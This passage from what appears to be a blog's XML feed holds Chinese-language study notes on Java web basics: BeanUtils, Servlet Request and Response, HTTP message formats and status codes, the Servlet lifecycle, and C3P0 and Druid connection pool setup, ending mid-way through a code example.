        <content type="html"><![CDATA[<p>导入 maven 坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.9.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用于简化数据封装（JavaBean）</p><p>方法：</p><ul><li>setProperty(Object bean,String name, Object value)</li><li>getProperty(Object bean, String name)</li><li>pupulate(Object obj, Map map)：将 map 集合的键值对信息封装到对应的 JavaBean 对象中</li></ul><p>JavaBean：</p><ol><li>类必须被 public 修饰</li><li>必须提供空参构造器</li><li>成员变量必须使用 private 修饰</li><li>提供公共 getter 和 setter 方法</li></ol><p>属性：setter 和 getter 方法截取后的产物，不完全等于成员变量</p><p>​ 例如：getUsername() -&gt;Username-&gt;username</p>]]></content>
      
      
      
        <tags>
            
            <tag> java工具类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Request&amp;&amp;Response</title>
      <link href="/2022/03/09/Request/"/>
      <url>/2022/03/09/Request/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ol><li>request和response对象是由服务器创建的</li><li>request对象用来获取请求消息，response用来设置响应消息</li></ol><h2 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h2><h3 id="继承体系"><a href="#继承体系" class="headerlink" title="继承体系"></a>继承体系</h3><p>ServletRequest   – 接口<br>        |<br>HttpServletRequest  – 接口<br>        |<br>org.apache.catalina.connector.RequestFacade 类（tomcat）</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><ol><li><p>获取请求消息数据</p><ol><li><p>获取请求行数据</p><p> GET  &#x2F;day14&#x2F;demo1?name&#x3D;zhangsan  HTTP&#x2F;1.1 </p><ul><li><p>获取请求方式：GET</p><p><code>String getMethod()</code></p></li><li><p>获取虚拟目录：&#x2F;day14</p><p><code>String getContextPath()</code></p></li><li><p>获取Servlet路径：&#x2F;demo1</p><p><code>String getServletPath()</code></p></li><li><p>获取get方式请求参数：name&#x3D;zhangsan</p><p><code>String getQueryString()</code></p></li><li><p>获取请求URI：&#x2F;day14&#x2F;demo1</p><p><code>String getRequestURI()</code></p><p>URL：<code>http://localhost/day14/demo1</code></p><p><code>StringBuffer getRequestURL()</code></p><blockquote><p>URL：统一资源定位符（中华人民共和国）</p><p>URI：统一资源标识符（共和国）</p></blockquote></li><li><p>获取协议及版本：HTTP&#x2F;1.1</p><p><code>String getProtocol()</code></p></li><li><p>获取客户机的IP地址：</p><p><code>String getRemoteAddr()</code></p></li></ul></li><li><p>获取请求头数据</p><ul><li><p>通过请求头名称获取请求头的值</p><p><code>String getHeader(String name)</code></p></li><li><p>获取所有请求头名称</p><p><code>Enumeration&lt;String&gt; getHeaderNames()</code></p></li></ul></li><li><p>获取请求体数据：</p><blockquote><p>只有POST请求方式才有请求体，在请求体中封装了POET请求的请求参数</p></blockquote><ol><li><p>获取流对象</p><p><code>BufferedReader getReader()</code>：获取字符输入流，只能操作字符数据</p><p><code>ServletInputStream getInputStream()</code>：获取字节输入流，可以操作所有类型数据</p></li><li><p>再从流中获取数据</p></li></ol></li></ol></li><li><p>其他功能：</p><ol><li><p>获取请求参数通用方式：不论get还是post请求方式都可以使用下列方法来获取请求参数</p><ul><li><code>String getParameter(String name)：</code>根据参数名称获取参数值</li><li><code>String[] getParameterValues(String name)</code>：根据参数名称获取参数值的数组</li><li><code>Enumeration&lt;String&gt; getParameterNames()</code>：获取所有请求参数名称</li><li><code>Map&lt;String, String[]&gt; getParameterMap()</code>：获取所有参数的Map集合</li></ul><p>中文乱码问题：</p><ul><li>get方式：先使用’iso-8859-1’字符集解析get参数，再转化成utf-8编码的java 的String对象</li></ul></li></ol><p>  <code>String name = new String(request.getParameter(&quot;name&quot;).getBytes(&quot;iso-8859-1&quot;),&quot;utf-8&quot;);</code></p><blockquote><p>tomcat8已经将get方式乱码问题解决了</p><p>Tomcat8URI默认编码为“UTF-8”，而Tomcat7URI默认编码为“ISO-8859-1”</p></blockquote><ul><li>post方式：在获取参数前，设置request的编码<code>request.setCharacterEncoding(&quot;utf-8&quot;)</code></li></ul><ol start="2"><li>请求转发：一种在服务器内部的资源跳转方式</li></ol><ul><li>步骤：<ol><li>通过request对象获取请求转发器对象：<code>RequestDispatcher getRequestDispatcher(String path)</code></li><li>使用RequestDispatcher对象来进行转发：<code>forward(ServletRequest request, ServletResponse response)</code></li></ol><ul><li>特点：</li></ul><ol><li>浏览器地址栏路径不发生变化<ol start="2"><li>只能转发到当前服务器内部资源中</li></ol></li><li>转发是一次请求</li></ol></li></ul></li><li><p>共享数据：</p><p>   域对象：一个有作用范围的对象，可以在范围内共享数据</p><p>request域：代表一次请求的范围，一般用于请求转发的多个资源中共享数据</p><p>方法：</p><ol><li><p><code>void setAttribute(String name, Object obj)</code>：存储数据</p></li><li><p><code>Object getAttribute(String name)</code>：通过键获取值</p></li><li><p><code>void removeAttribute(String name)</code>：通过键移除键值对</p></li><li><p>获取ServletContext：</p><p><code>ServletContext getServletContext()</code></p></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议中的请求消息与响应消息</title>
      <link href="/2022/03/08/HTTP/"/>
      <url>/2022/03/08/HTTP/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Hyper Text Transfer Protocol 超文本传输协议</p><p>传输协议 ： 定义了客户端和服务器通信时，发送数据的格式</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>基于 TCP&#x2F;IP 的高级协议</li><li>默认端口号：80</li><li>基于请求&#x2F;响应模型的：一次请求对应一次响应</li><li>无状态的：每次请求之间相互独立，不能交互数据</li></ol><h3 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h3><ul><li>1.0：每一次请求响应都会建立新的连接</li><li>1.1：复用连接</li></ul><h2 id="请求消息数据格式"><a href="#请求消息数据格式" class="headerlink" title="请求消息数据格式"></a>请求消息数据格式</h2><ol><li><h3 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a><strong>请求行</strong></h3><ul><li><p>格式：</p><p>请求方式 请求 url 请求协议&#x2F;版本</p><pre class="line-numbers language-none"><code class="language-none">Get &#x2F;login.html HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><em>请求方式：</em></p><p>Http 协议中有 7 种请求方式，常用的两种：</p><ul><li><p>GET：</p><ol><li>请求参数在请求行中，在 url 后</li><li>请求的 url 长度有限制</li><li>不太安全</li></ol></li><li><p>POST：</p><ol><li>请求参数在请求体中</li><li>请求的 url 长度没有限制</li><li>相对安全</li></ol></li></ul></li></ul></li><li><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a><strong>请求头</strong></h3><p>客户端告诉浏览器一些信息</p><ul><li><p>格式：</p><p>请求头名称：请求头值</p></li><li><p><em>常见的请求头：</em></p><ul><li><p>User-Agent：浏览器告诉服务器，访问所使用的浏览器版本信息</p><blockquote><p>可以在服务器端获取该头的信息，解决浏览器的兼容性问题</p></blockquote></li><li><p>Referer：告诉服务器，我（当前请求）从哪里来</p><p>作用：防盗链；统计工作</p></li></ul></li></ul></li><li><h3 id="请求空行"><a href="#请求空行" class="headerlink" title="请求空行"></a><strong>请求空行</strong></h3><p>空行，就是用于分割 POST 请求的请求头和请求体的</p></li><li><h3 id="请求体（正文）"><a href="#请求体（正文）" class="headerlink" title="请求体（正文）"></a><strong>请求体（正文）</strong></h3><p>封装 POST 请求消息的请求参数</p></li></ol><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;login.html HTTP&#x2F;1.1Host: localhostUser-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko&#x2F;20100101 Firefox&#x2F;60.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateReferer: http:&#x2F;&#x2F;localhost&#x2F;login.htmlConnection: keep-aliveUpgrade-Insecure-Requests: 1username&#x3D;zhangsan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="响应消息数据格式"><a href="#响应消息数据格式" class="headerlink" title="响应消息数据格式"></a>响应消息数据格式</h2><ol><li><h3 id="响应行"><a href="#响应行" class="headerlink" title="响应行"></a>响应行</h3><ul><li><p>格式：</p><p>协议&#x2F;版本 响应状态码 状态码描述</p></li><li><p>响应状态码：服务器告诉客户端浏览器本次请求和响应的状态</p><ol><li>状态码都是三位数字</li><li>分类：<ul><li>1xx：服务器接收客户端消息，但是没有接收完成，等待一段时间后，发送 1xx 状态码</li><li>2xx：成功。代表：200</li><li>3xx：重定向。代表：302（重定向），304（访问缓存）</li><li>4xx：客户端错误。代表：404（请求路径没有对应的资源），405（请求方式没有对应的 doXxx()方法）</li><li>5xx：服务器错误。代表：500（服务器内部出现异常）</li></ul></li></ol></li></ul></li><li><h3 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h3><ul><li><p>格式：</p><p>响应头名称：值</p></li><li><p>常见的响应头：</p><ol><li><p>Content-Type：服务器告诉客户端本次相应数据格式以及编码格式</p></li><li><p>Content-disposition：服务器告诉客户端以什么格式打开响应体数据</p><p>值：</p><ul><li>in-line：默认值，在当前页面内打开</li><li>attachment;filename&#x3D;xxx：以附件形式打开响应体。文件下载</li></ul></li></ol></li></ul></li><li><h3 id="响应空行"><a href="#响应空行" class="headerlink" title="响应空行"></a>响应空行</h3></li><li><h3 id="响应体"><a href="#响应体" class="headerlink" title="响应体"></a>响应体</h3><p>响应体内容就是传输的数据</p></li></ol><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKContent-Type: text&#x2F;html;charset&#x3D;UTF-8Content-Length: 101Date: Wed, 06 Jun 2018 07:08:42 GMT&lt;html&gt;&lt;head&gt;&lt;title&gt;$Title$&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;hello , response&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h2><ul><li><h4 id="2XX-Success-成功状态码-请求正常处理完毕"><a href="#2XX-Success-成功状态码-请求正常处理完毕" class="headerlink" title="2XX  Success(成功状态码) 请求正常处理完毕"></a><strong>2XX</strong>  Success(成功状态码) 请求正常处理完毕</h4><ul><li><strong>200 OK</strong>:表示从客户端发送给服务器的请求被正常处理并返回</li><li><strong>204 NO Content</strong>:表示客户端发送给客户端的请求得到了成功处理,但在返回的响应报文中不含实体的主体部分(没有资源可以返回)</li></ul></li><li><h4 id="3XX-Redirection-重定向-需要进行附加操作以完成请求"><a href="#3XX-Redirection-重定向-需要进行附加操作以完成请求" class="headerlink" title="3XX  Redirection(重定向) 需要进行附加操作以完成请求"></a>3XX  Redirection(重定向) 需要进行附加操作以完成请求</h4><ul><li><strong>301 Moved Permanently：</strong>永久性重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL；</li><li><strong>302 Found：</strong>临时性重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL;<br>301与302的区别：前者是永久移动，后者是临时移动（之后可能还会更改URL）</li><li><strong>303 See Other：</strong>表示请求的资源被分配了新的URL，应使用GET方法定向获取请求的资源；<br>302与303的区别：后者明确表示客户端应当采用GET方式获取资源</li><li><strong>304 Not Modified：</strong>表示客户端发送附带条件（是指采用GET方法的请求报文中包含if-Match、If-Modified-Since、If-None-Match、If-Range、If-Unmodified-Since中任一首部）的请求时，服务器端允许访问资源，但是请求为满足条件的情况下返回改状态码；</li><li><strong>307 Temporary Redirect：</strong>临时重定向，与303有着相同的含义，307会遵照浏览器标准不会从POST变成GET；（不同浏览器可能会出现不同的情况）；</li></ul></li><li><h4 id="4XX-Client-error-客户端错误-客户端请求出错-服务器无法处理请求"><a href="#4XX-Client-error-客户端错误-客户端请求出错-服务器无法处理请求" class="headerlink" title="4XX Client error(客户端错误) 客户端请求出错,服务器无法处理请求"></a>4XX Client error(客户端错误) 客户端请求出错,服务器无法处理请求</h4><ul><li><strong>400 Bad Request：</strong>表示请求报文中存在语法错误；</li><li><strong>401 Unauthorized：</strong>未经许可，需要通过HTTP认证；</li><li><strong>403 Forbidden：</strong>服务器拒绝该次访问（访问权限出现问题）</li><li><strong>404 Not Found：</strong>表示服务器上无法找到请求的资源，除此之外，也可以在服务器拒绝请求但不想给拒绝原因时使用；</li><li><strong>405 ：</strong> 服务器不支持对应http方法get&#x2F;post</li></ul></li><li><h4 id="5XX-Server-error-服务器错误-服务器处理请求出错"><a href="#5XX-Server-error-服务器错误-服务器处理请求出错" class="headerlink" title="5XX Server error(服务器错误) 服务器处理请求出错"></a>5XX Server error(服务器错误) 服务器处理请求出错</h4><ul><li><strong>500 Inter Server Error：</strong>表示服务器在执行请求时发生了错误，也有可能是web应用存在的bug或某些临时的错误时；</li><li><strong>503 Server Unavailable：</strong>表示服务器暂时处于超负载或正在进行停机维护，无法处理请求；</li></ul></li></ul><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTP + SSL 在 HTTP 的基础上通过传输加密和身份认证保证了传输过程的安全性。 </p><p>HTTPS数据加密，可保证数据私密性、完整性，防止中间人攻击。</p><p><img src="/./HTTP/image-20230818104104662.png" alt="image-20230818104104662"></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ol><li>浏览器将自己支持的一套加密算法发给服务器，同时发一个浏览器随机数</li><li>服务器向浏览器发送选择的加密算法、服务器生成的随机数、服务器数字证书</li><li>浏览器收到证书后对证书的CA签名进行验证，如果验证通过，会从证书中拿到服务器的公钥</li><li>浏览器对浏览器随机数+服务器随机数进行处理，生成预备主密码</li><li>浏览器用服务器的公钥对预备主密码进行加密，发给服务器。</li><li>服务器收到后使用自己的私钥解密出预备主密钥</li><li>浏览器和服务器分别使用预备主密钥和两个随机数，生成共享主密钥</li><li>二者使用共享主密钥，使用对称加密算法加密数据</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Servlet</title>
      <link href="/2022/03/06/Servlet/"/>
      <url>/2022/03/06/Servlet/</url>
      
        <content type="html"><![CDATA[<h2 id="概念（Server-applet）"><a href="#概念（Server-applet）" class="headerlink" title="概念（Server applet）"></a>概念（Server applet）</h2><p>运行在 Web 服务器或应用服务器上的程序,它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层</p><ul><li><p>Servlet 就是一个接口，定义了 Java 类被浏览器访问到（tomcat 识别）的规则。</p></li><li><p>定义一个类，实现 Servlet 接口，重写方法</p></li></ul><h2 id="执行原理"><a href="#执行原理" class="headerlink" title="执行原理"></a>执行原理</h2><ol><li>当服务器接收到客户端浏览器的请求后，会解析请求 URL 路径，获取访问的 Servlet 的资源路径</li><li>查找 web.xml 文件，是否有对应的<url-pattern>标签体内容</li><li>如果有，则在找到对应的<servlet-class>全类名</li><li>tomcat 会将字节码文件加载进内存，并且创建其对象</li><li>调用其方法</li></ol><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2><ol><li><p>被创建：执行 init()方法，只执行一次</p><ul><li><p>Servlet 什么时候被创建？</p><p>默认情况下，第一次访问时，Servlet 被创建</p><p>可以配置执行 Servlet 的创建时机</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>   <span class="token comment">&lt;!--负数表示在第一次访问时创建，非负数表示在服务器启动时创建 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Servlet 的 init 方法，只执行一次，说明一个 Servlet 在内存中只存在一个对象，是单例的</p><p><strong>多个用户同时访问时，可能存在线程安全问题</strong></p><p>解决：尽量不要在 Servlet 中定义成员变量，即使定义了成员变量，也不要修改其值</p></li></ul></li><li><p>提供服务：执行 service()方法，执行多次</p><p>每次访问 Servlet 时，service 方法都会被调用一次</p></li><li><p>被销毁：执行 destroy 方法，只执行一次</p><p>Servlet 被销毁时执行，服务器关闭时，Servlet 被销毁</p><p>只有服务器正常关闭才会执行 destroy 方法</p><blockquote><p>destroy 方法在 Servlet 被销毁之前执行，一般用于释放资源</p></blockquote></li></ol><h2 id="Servlet3-0："><a href="#Servlet3-0：" class="headerlink" title="Servlet3.0："></a>Servlet3.0：</h2><ul><li><p>好处：</p><p>支持注解配置，可以不需要 web.xml 了</p></li><li><p>步骤：</p><ol><li>创建 JavaEE 项目，选择 Servlet3.0 以上版本，可以不创建 web.xml</li><li>定义一个类，实现 Servlet 接口</li><li>重写方法</li><li>在类上使用@WebServlet 注解，进行配置@WebServlet(“资源路径”)<ul><li>一个 Servlet 可以定义多个访问路径：@WebServlet({“&#x2F;d4”,”&#x2F;dd4”,”&#x2F;ddd4”})</li><li>路径定义规则： 1. &#x2F;xxx：路径匹配 2. &#x2F;xxx&#x2F;xxx:多层路径，目录结构 3. *.do：扩展名匹配</li></ul></li></ol></li></ul><h2 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h2><p>Servlet – 接口<br>|<br>GenericServlet – 抽象类<br>|<br>HttpServlet – 抽象类</p><ul><li><p>GenericServlet：将 Servlet 接口中除了 service()以外的方法做了默认空实现</p><p>将来定义 Servlet 类时，可以继承 GenericServlet，实现 service()方法即可</p></li><li><p>HttpServlet：对 http 协议的一种封装，简化操作</p><ol><li>定义类继承 HttpServlet</li><li>重写 doGet&#x2F;doPost 方法</li></ol></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库连接池及Spring JDBC的简单使用</title>
      <link href="/2022/03/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/"/>
      <url>/2022/03/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>其实就是一个容器（集合），存放数据库连接的容器。</p><p>当系统初始化好后，容器被创建，容器中会申请一些连接对象，当用户来访问数据库时，从容器中获取连接对象，访问完之后，会将连接对象归还给连接池</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><ol><li><p>标准接口：<code>javax.sql.DataSource</code></p><p>方法：</p><ul><li>获取连接：<code>getConnection()</code></li><li>归还连接：<code>Connection.close()</code>。如果连接对象<code>Connection</code>是从连接池中获取的，那么调用<code>Connection.close()</code>方法，则不会再关闭连接了。而是归还连接</li></ul></li><li><p>一般我们不实现它，由数据库厂商来实现</p><ul><li>C3P0</li><li>Druid</li></ul></li></ol><h2 id="C3P0：数据库连接池技术"><a href="#C3P0：数据库连接池技术" class="headerlink" title="C3P0：数据库连接池技术"></a>C3P0：数据库连接池技术</h2><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p>导入 jar 包<code>c3p0-0.9.5.2.jar</code> <code>mchange-commons-java-0.2.12.jar</code></p><blockquote><p>不要忘记导入数据库驱动 jar 包</p></blockquote></li><li><p>定义配置文件：</p><ul><li><p>名称：<code>c3p0.properties</code> 或者 <code>c3p0-config.xml</code></p></li><li><p>路径：直接放置于 src 下即可</p></li><li><p>示例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c3p0-config</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- 使用默认的配置读取连接池对象 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>default-config</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!--  连接参数 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>com.mysql.jdbc.Driver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>jdbc:mysql://localhost:3306/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 连接池参数 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>initialPoolSize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>maxPoolSize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkoutTimeout<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>3000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>default-config</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>named-config</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>otherc3p0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--  连接参数 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>com.mysql.jdbc.Driver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>jdbc:mysql://localhost:3306/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- 连接池参数 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>initialPoolSize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>maxPoolSize<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>checkoutTimeout<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>1000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>named-config</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c3p0-config</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>创建核心对象：数据库连接池对象<code>ComboPooledDataSource</code></p></li><li><p>获取连接：<code>getConnection()</code></p></li></ol><h2 id="Druid：由阿里巴巴提供的数据库连接池实现技术"><a href="#Druid：由阿里巴巴提供的数据库连接池实现技术" class="headerlink" title="Druid：由阿里巴巴提供的数据库连接池实现技术"></a>Druid：由阿里巴巴提供的数据库连接池实现技术</h2><h3 id="步骤-："><a href="#步骤-：" class="headerlink" title="步骤 ："></a>步骤 ：</h3><ol><li><p>导入 jar 包，<code>druid-1.2.8.jar</code></p></li><li><p>定义配置文件</p><ul><li><p>是 properties 形式的</p></li><li><p>可以叫任意名称，可放置于任意目录下</p></li><li><p>示例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">driverClassName=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/testusername=rootpassword=root# 初始化连接数initialSize=5# 最大连接数maxActive=10maxWait=3000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>加载配置文件，Properties</p></li><li><p>获取数据库连接对象：通过工厂类来实现 <code>DruidDataSourceFactory</code></p></li><li><p>获取连接：<code>getConnection</code></p><p>代码示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 加载配置文件</span><span class="token class-name">Properties</span> pro <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token class-name">DruidDemo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token 